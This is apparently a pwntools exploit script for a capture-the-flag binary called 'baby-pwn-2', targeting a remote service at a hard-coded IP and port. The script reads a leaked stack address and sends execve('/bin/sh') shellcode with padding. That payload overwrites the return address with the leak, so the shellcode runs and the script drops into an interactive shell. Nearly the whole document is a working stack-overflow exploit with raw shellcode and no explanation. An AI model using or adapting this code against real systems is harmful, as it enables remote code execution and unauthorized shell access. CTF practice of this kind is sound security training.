#!/usr/bin/env python3

from pwn import *

elf = ELF("./baby-pwn-2_patched")

gs = '''
init-pwndbg
continue
'''

context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("34.162.119.16", 5000)

io = conn()

def main():

    # good luck pwning :)

    #gdb.attach(io, gdbscript=gs)

    io.recvline()
    io.recvuntil(b'leak: ')
    stackleak = int(io.recvuntil(b'\n').strip(), 16)
    info(hex(stackleak))

    shellcode = "\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"
    payload = flat(shellcode, b'A'*34, p64(stackleak))
    io.sendlineafter(b'text:', payload)

    io.interactive()

if __name__ == "__main__":
    main()
